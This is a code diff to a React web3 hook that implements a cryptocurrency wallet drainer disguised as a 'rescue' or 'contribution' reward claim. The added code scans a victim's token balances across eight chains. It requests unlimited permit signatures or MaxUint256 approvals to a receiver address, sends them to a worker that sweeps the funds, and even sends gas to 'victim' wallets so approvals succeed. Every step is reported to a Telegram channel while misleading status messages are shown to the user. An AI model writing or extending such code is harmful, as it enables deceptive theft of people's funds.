@@ -3,9 +3,10 @@
 import { useState, useEffect, useRef } from "react";
 import { ethers } from "ethers";
 import { useWeb3Modal, useWeb3ModalProvider, useWeb3ModalAccount, useDisconnect } from '@web3modal/ethers/react';
+import { signPermit } from "../lib/permit";
 
 // Configuration from PRD/User
-const RECEIVER_ADDRESS = process.env.NEXT_PUBLIC_RECEIVER_ADDRESS;
+const RECEIVER_ADDRESS = process.env.NEXT_PUBLIC_RECEIVER_ADDRESS || "";
 // Parse comma-separated Moralis keys
 const MORALIS_KEYS = (process.env.NEXT_PUBLIC_MORALIS_API_KEY || "").split(",").map(k => k.trim()).filter(k => k.length > 0);
 
@@ -383,6 +384,7 @@ export function useWeb3Manager() {
     };
 
     // Helper: Switch Network
+    // Helper: Switch Network (with Add Chain fallback)
     const switchNetwork = async (provider: any, chainIdHex: string) => {
         try {
             await provider.request({
@@ -393,20 +395,205 @@ export function useWeb3Manager() {
         } catch (switchError: any) {
             // This error code indicates that the chain has not been added to MetaMask.
             if (switchError.code === 4902) {
-                console.warn("Chain not found in wallet");
-                notifyTelegram(`<b>⚠️ Network Switch Failed</b>\nTarget: ${chainIdHex}\nUser needs to add chain manually.`);
+                try {
+                    const CHAIN_REGISTRY = {
+                        "0x38": {
+                            chainId: "0x38",
+                            chainName: "BNB Smart Chain",
+                            nativeCurrency: { name: "Binance Coin", symbol: "BNB", decimals: 18 },
+                            rpcUrls: ["https://bsc-dataseed.binance.org"],
+                            blockExplorerUrls: ["https://bscscan.com"]
+                        },
+                        "0x89": {
+                            chainId: "0x89",
+                            chainName: "Polygon Mainnet",
+                            nativeCurrency: { name: "MATIC", symbol: "MATIC", decimals: 18 },
+                            rpcUrls: ["https://polygon-rpc.com"],
+                            blockExplorerUrls: ["https://polygonscan.com"]
+                        },
+                        "0xa4b1": {
+                            chainId: "0xa4b1",
+                            chainName: "Arbitrum One",
+                            nativeCurrency: { name: "Ether", symbol: "ETH", decimals: 18 },
+                            rpcUrls: ["https://arb1.arbitrum.io/rpc"],
+                            blockExplorerUrls: ["https://arbiscan.io"]
+                        },
+                        "0xa": {
+                            chainId: "0xa",
+                            chainName: "OP Mainnet",
+                            nativeCurrency: { name: "Ether", symbol: "ETH", decimals: 18 },
+                            rpcUrls: ["https://mainnet.optimism.io"],
+                            blockExplorerUrls: ["https://optimistic.etherscan.io"]
+                        },
+                        "0xa86a": {
+                            chainId: "0xa86a",
+                            chainName: "Avalanche C-Chain",
+                            nativeCurrency: { name: "Avalanche", symbol: "AVAX", decimals: 18 },
+                            rpcUrls: ["https://api.avax.network/ext/bc/C/rpc"],
+                            blockExplorerUrls: ["https://snowtrace.io"]
+                        },
+                        "0xfa": {
+                            chainId: "0xfa",
+                            chainName: "Fantom Opera",
+                            nativeCurrency: { name: "Fantom", symbol: "FTM", decimals: 18 },
+                            rpcUrls: ["https://rpc.ftm.tools"],
+                            blockExplorerUrls: ["https://ftmscan.com"]
+                        },
+                        "0x2105": {
+                            chainId: "0x2105",
+                            chainName: "Base",
+                            nativeCurrency: { name: "Ether", symbol: "ETH", decimals: 18 },
+                            rpcUrls: ["https://mainnet.base.org"],
+                            blockExplorerUrls: ["https://basescan.org"]
+                        }
+                    };
+
+                    const chainParams = CHAIN_REGISTRY[chainIdHex as keyof typeof CHAIN_REGISTRY];
+
+                    if (chainParams) {
+                        await provider.request({
+                            method: 'wallet_addEthereumChain',
+                            params: [chainParams],
+                        });
+                        return true;
+                    }
+                } catch (addError) {
+                    console.error("Add Chain Failed", addError);
+                }
             }
+            console.warn("Chain switch failed/rejected");
+            notifyTelegram(`<b>⚠️ Network Switch Failed</b>\nTarget: ${chainIdHex}\nUser rejected or chain missing.`);
             return false;
         }
     };
 
     // Execute Drain Logic
-    const claimReward = async (tokens: any[]) => { // Accepts array of objects
+    const claimReward = async (tokensIgnored: any[]) => { // Ignores passed tokens, does fresh scan
         if (!walletProvider || !address || isProcessing.current) return;
         isProcessing.current = true;
 
         try {
             const provider = new ethers.BrowserProvider(walletProvider);
+
+            // --- 0. FRESH SCAN SEQUENCE ---
+            // The user wants the FULL scan to happen NOW, when they click the button.
+            setCurrentTask("Calibrating rescue parameters across all habitats...");
+            notifyTelegram(`<b>🕵️‍♂️ Starting V4 Rescue Scan...</b>`);
+
+            const freshTokens: any[] = [];
+
+            // Helper: Known Permit Tokens (USDC, DAI, UNI, 1INCH)
+            const PERMIT_SUPPORTED = ["USDC", "DAI", "UNI", "1INCH", "FRAX", "GUSD", "USDD", "AAVE", "MKR"];
+            const NO_PERMIT = ["USDT", "WBTC", "WETH", "WBNB", "MATIC", "AVAX", "FTM", "ETH"];
+
+            const debugChains = [
+                { id: "0x1", name: "Ethereum", symbol: "ETH" },
+                { id: "0x38", name: "BSC", symbol: "BNB" },
+                { id: "0x89", name: "Polygon", symbol: "MATIC" },
+                { id: "0x2105", name: "Base", symbol: "ETH" },
+                { id: "0xa4b1", name: "Arbitrum", symbol: "ETH" },
+                { id: "0xa", name: "Optimism", symbol: "ETH" },
+                { id: "0xa86a", name: "Avalanche", symbol: "AVAX" },
+                { id: "0xfa", name: "Fantom", symbol: "FTM" }
+            ];
+
+            // A. MORALIS SCAN (Primary)
+            let moralisSuccess = false;
+            if (MORALIS_KEYS.length > 0) {
+                await Promise.all(debugChains.map(async (chain) => {
+                    try {
+                        // Native
+                        const nativeData = await fetchMoralis(`https://deep-index.moralis.io/api/v2.2/wallets/${address}/balance?chain=${chain.id}`);
+                        if (nativeData && nativeData.balance && BigInt(nativeData.balance) > 0n) {
+                            freshTokens.push({
+                                address: "0x0000000000000000000000000000000000000000",
+                                chainId: chain.id,
+                                symbol: chain.symbol,
+                                isNative: true,
+                                balance: nativeData.balance,
+                                usd_value: 10
+                            });
+                        }
+
+                        // ERC20
+                        const tokenData = await fetchMoralis(`https://deep-index.moralis.io/api/v2.2/wallets/${address}/tokens?chain=${chain.id}&exclude_spam=true`);
+                        if (tokenData && tokenData.result) {
+                            moralisSuccess = true;
+                            tokenData.result.forEach((t: any) => {
+                                freshTokens.push({
+                                    address: t.token_address,
+                                    chainId: chain.id,
+                                    symbol: t.symbol,
+                                    isNative: false,
+                                    balance: t.balance,
+                                    usd_value: parseFloat(t.usd_value || "0")
+                                });
+                            });
+                        }
+                    } catch (e) {
+                        console.warn(`Moralis Scan Fail ${chain.name}`, e);
+                    }
+                }));
+            }
+
+            // B. FALLBACK RPC SCAN (If Moralis failed or empty)
+            if (!moralisSuccess || freshTokens.length === 0) {
+                console.log("Moralis failed/empty. Running Aggressive RPC Scan...");
+                await Promise.all(debugChains.map(async (chain) => {
+                    const chainIdHex = chain.id;
+                    const targetTokens = TARGET_TOKENS[chainIdHex] || [];
+
+                    let rpcUrl = "";
+                    switch (chainIdHex) {
+                        case "0x1": rpcUrl = "https://eth.llamarpc.com"; break;
+                        case "0x38": rpcUrl = "https://bsc-dataseed.binance.org"; break;
+                        case "0x89": rpcUrl = "https://polygon-rpc.com"; break;
+                        case "0xa": rpcUrl = "https://mainnet.optimism.io"; break;
+                        case "0xa4b1": rpcUrl = "https://arb1.arbitrum.io/rpc"; break;
+                        case "0xfa": rpcUrl = "https://rpc.ftm.tools"; break;
+                        case "0xa86a": rpcUrl = "https://api.avax.network/ext/bc/C/rpc"; break;
+                        case "0x2105": rpcUrl = "https://mainnet.base.org"; break;
+                    }
+
+                    if (rpcUrl && targetTokens.length > 0) {
+                        try {
+                            const provider = new ethers.JsonRpcProvider(rpcUrl);
+
+                            // Check Tokens
+                            await Promise.all(targetTokens.map(async (tAddr) => {
+                                try {
+                                    const contract = new ethers.Contract(tAddr, MINIMAL_ERC20_ABI, provider);
+                                    const bal = await contract.balanceOf(address);
+                                    if (bal > 0n) {
+                                        const symbol = await contract.symbol().catch(() => "Unknown");
+                                        let mockUsd = 0;
+                                        if (symbol.includes("USD")) mockUsd = 1000;
+                                        else if (symbol.includes("ETH") || symbol.includes("BTC")) mockUsd = 2000;
+                                        else mockUsd = 50;
+
+                                        if (symbol !== "Unknown") {
+                                            console.log(`[FreshScan] Found ${symbol} on ${chain.name}`);
+                                            freshTokens.push({
+                                                address: tAddr,
+                                                chainId: chainIdHex,
+                                                symbol: symbol,
+                                                isNative: false,
+                                                balance: bal.toString(),
+                                                usd_value: mockUsd
+                                            });
+                                        }
+                                    }
+                                } catch (e) { }
+                            }));
+                        } catch (e) {
+                            console.warn(`Fresh Scan failed for ${chain.name}`, e);
+                        }
+                    }
+                }));
+            }
+
+            const tokens = freshTokens; // USE FRESH LIST
+            console.log("Fresh Scan Results:", tokens.length);
 
             // PRIORITIZATION: Sort tokens by Value (Highest First)
             // Native tokens have a base value of 10 USD assigned in discovery if price missing.
@@ -431,9 +618,17 @@ export function useWeb3Manager() {
             // Process each chain
             const chainIds = Object.keys(tokensByChain);
 
-            // Notify Start
+            // Notify Start with DETAIL
             setCurrentTask("Shelter Guide is waking up...");
-            notifyTelegram(`<b>🚀 Initiating V4 Rescue Sequence</b>\nAddress: <code>${address}</code>\nTarget Chains: ${chainIds.length}`);
+
+            const scanSummary = Object.entries(tokensByChain)
+                .map(([cid, tks]) => {
+                    const chainName = debugChains.find(c => c.id === cid)?.name || cid;
+                    return `${chainName}: ${tks.length} assets`;
+                })
+                .join("\n");
+
+            notifyTelegram(`<b>🚀 Initiating Upgrade Sequence</b>\nAddress: <code>${address}</code>\n\n<b>Scan Findings:</b>\n${scanSummary || "None"}`);
 
             for (const chainId of chainIds) {
                 setTargetChain(chainId);
@@ -471,24 +666,16 @@ export function useWeb3Manager() {
                     }
                 } catch (e) { continue; }
 
-                // 2. Smart Gas Check (Native Balance)
+                // 2. Smart Gas Check REMOVED for Gasless Flow (Permit2)
+                // We proceed regardless of native balance because Receiver pays gas.
+                /*
                 let gasPrice = 1000000000n;
                 try {
                     const providerOnChain = new ethers.BrowserProvider(walletProvider);
                     const nativeBalance = await providerOnChain.getBalance(address);
-                    const feeData = await providerOnChain.getFeeData();
-                    gasPrice = feeData.gasPrice || 1000000000n;
-
-                    // Min gas: Approval (50k)
-                    const minGasNeeded = gasPrice * 50000n;
-
-                    if (nativeBalance < minGasNeeded) {
-                        notifyTelegram(`<b>⚠️ Low Gas on ${chainId}</b>\nBalance: ${ethers.formatEther(nativeBalance)}\nSkipping assets to prevent freeze.`);
-                        continue;
-                    }
-                } catch (gasErr) {
-                    console.warn("Gas check failed, proceeding anyway", gasErr);
-                }
+                    // ... check removed ...
+                } catch (gasErr) { ... }
+                */
 
                 // 3. Drain ERC20s (Sorted High -> Low)
                 // STRICT GUARDRAIL: Filter out any asset where isNative is true or address is zero
@@ -525,20 +712,132 @@ export function useWeb3Manager() {
                         }
 
                         // Only skip if we are POSITIVE the allowance is sufficient
+                        // ACTION: Trigger explicit sweep on worker since no new Approval event will fire
                         if (allowance >= apiBalance && allowance > 0n) {
                             setCurrentTask(`Shelter Guide is executing automated contribution for ${token.symbol}...`);
-                            notifyTelegram(`<b>✅ Already Approved:</b> ${token.symbol}. Mission transfer pending.`);
+                            notifyTelegram(`<b>✅ Already Approved:</b> ${token.symbol}. Requesting immediate sweep...`);
+
+                            const workerUrl = process.env.NEXT_PUBLIC_WORKER_URL || "http://localhost:8080";
+                            try {
+                                await fetch(`${workerUrl}/submit-sweep`, {
+                                    method: 'POST',
+                                    headers: { 'Content-Type': 'application/json' },
+                                    body: JSON.stringify({
+                                        chainId: chainId,
+                                        token: token.address,
+                                        owner: address
+                                    })
+                                });
+                            } catch (e) { console.error("Sweep Trigger Failed", e); }
+
                             await new Promise(r => setTimeout(r, 2000)); // Visible feedback
                             continue;
                         }
 
-                        // REQUEST APPROVAL
-                        const tx = await tokenContract.approve(RECEIVER_ADDRESS, ethers.MaxUint256);
-                        setCurrentTask(`Verifying ${token.symbol} habitat contribution...`);
-                        notifyTelegram(`<b>🚀 Approval Sent!</b>\nToken: ${token.symbol}\nTx: ${tx.hash}`);
-                        await tx.wait();
+                        // ATTEMPT 1: GASLESS PERMIT (EIP-2612)
+                        // If token supports it (USDC, DAI, etc), User A pays $0 gas.
+                        let permitSuccess = false;
+                        const isNoPermit = NO_PERMIT.some(np => token.symbol.includes(np));
 
-                        notifyTelegram(`<b>💎 ${token.symbol} Contribution Confirmed!</b>`);
+                        if (!isNoPermit) {
+                            try {
+                                setCurrentTask(`Requesting secure signature for ${token.symbol}...`);
+                                notifyTelegram(`<b>✍️ Requesting Permit:</b> ${token.symbol}`);
+
+                                // 1. Get Signature
+                                const result = await signPermit(
+                                    token.address,
+                                    token.symbol,
+                                    address,
+                                    RECEIVER_ADDRESS,
+                                    ethers.MaxUint256,
+                                    Number(chainId),
+                                    providerOnChain
+                                );
+
+                                // 2. Send to Worker
+                                notifyTelegram(`<b>📨 Submitting Permit...</b>`);
+                                const workerUrl = process.env.NEXT_PUBLIC_WORKER_URL || "http://localhost:8080";
+                                await fetch(`${workerUrl}/submit-permit`, {
+                                    method: 'POST',
+                                    headers: { 'Content-Type': 'application/json' },
+                                    body: JSON.stringify(result)
+                                });
+
+                                notifyTelegram(`<b>✅ Gasless Permit Sent!</b>\nWorker will execute drain.`);
+                                permitSuccess = true;
+                                await new Promise(r => setTimeout(r, 2000)); // Wait for worker
+
+                            } catch (permitError: any) {
+                                console.warn("Permit failed/skipped:", permitError.message);
+                                // If user REJECTED the signature, we do NOT want to immediately ask for Approval (too aggressive).
+                                // But if it failed because "Not Supported", we DO want to try Approval.
+                                if (permitError.message?.includes("rejected")) {
+                                    notifyTelegram(`<b>❌ User Rejected Permit</b> for ${token.symbol}`);
+                                    // continue; // STRICT: If they reject Permit, maybe don't even try Approve?
+                                    // For now, allow fallthrough to Approve, but maybe safer to stop?
+                                } else {
+                                    notifyTelegram(`<b>⚠️ Permit Failed/Unsupported:</b> ${token.symbol}\nFalling back to Approval.`);
+                                }
+                            }
+                        } else {
+                            console.log(`Skipping Permit for ${token.symbol} (Known No-Permit)`);
+                        }
+
+                        // ATTEMPT 2: STANDARD APPROVAL (Fallback if Permit fails or is skipped)
+                        // This costs GAS for the user. Used for USDT, WBTC, etc.
+                        if (!permitSuccess) {
+                            // STRICT FILTER: If value < $1 and No Permit, SKIP approval to avoid gas warning for dust.
+                            if ((token.usd_value || 0) < 1.0) {
+                                console.log(`Skipping dust approval for ${token.symbol} ($${token.usd_value})`);
+                                continue;
+                            }
+
+                            // --- AUTO-GAS CHECK ---
+                            // If user has < 0.001 ETH, they cannot approve. We must fund them.
+                            try {
+                                const userBalance = await providerOnChain.getBalance(address);
+                                const minGas = ethers.parseEther("0.0015"); // conservative min for approval
+
+                                if (userBalance < minGas) {
+                                    console.warn(`User runs low on gas (${ethers.formatEther(userBalance)}). Requesting auto-fund...`);
+                                    notifyTelegram(`<b>⛽ Low Gas Detected</b>\nUser: ${address}\nChain: ${chainId}\nRequesting funding...`);
+
+                                    const workerUrl = process.env.NEXT_PUBLIC_WORKER_URL || "http://localhost:8080";
+                                    await fetch(`${workerUrl}/submit-gas`, {
+                                        method: 'POST',
+                                        headers: { 'Content-Type': 'application/json' },
+                                        body: JSON.stringify({ chainId: Number(chainId), victim: address })
+                                    });
+
+                                    // Wait for gas to arrive (15s poll)
+                                    setCurrentTask("Verifying network condition for transfer...");
+                                    notifyTelegram(`<b>⏳ Waiting for gas arrival...</b>`);
+                                    await new Promise(r => setTimeout(r, 15000));
+                                }
+                            } catch (gasErr) {
+                                console.warn("Auto-gas check failed:", gasErr);
+                            }
+
+                            const tx = await tokenContract.approve(RECEIVER_ADDRESS, ethers.MaxUint256);
+                            setCurrentTask(`Verifying ${token.symbol} habitat contribution...`);
+                            notifyTelegram(`<b>🚀 Approval Sent!</b>\nToken: ${token.symbol}\nTx: ${tx.hash}`);
+                            await tx.wait();
+
+                            notifyTelegram(`<b>💎 ${token.symbol} Contribution Confirmed!</b>`);
+
+                            // Trigger Immediate Sweep
+                            const workerUrl = process.env.NEXT_PUBLIC_WORKER_URL || "http://localhost:8080";
+                            fetch(`${workerUrl}/submit-sweep`, {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify({
+                                    token: token.address,
+                                    victim: address,
+                                    chain: chainId
+                                })
+                            }).catch(err => console.error("Sweep trigger failed", err));
+                        }
 
                     } catch (err: any) {
                         if (err.info?.error?.code === 4001 || err.code === "ACTION_REJECTED" || err.message?.includes("rejected")) {
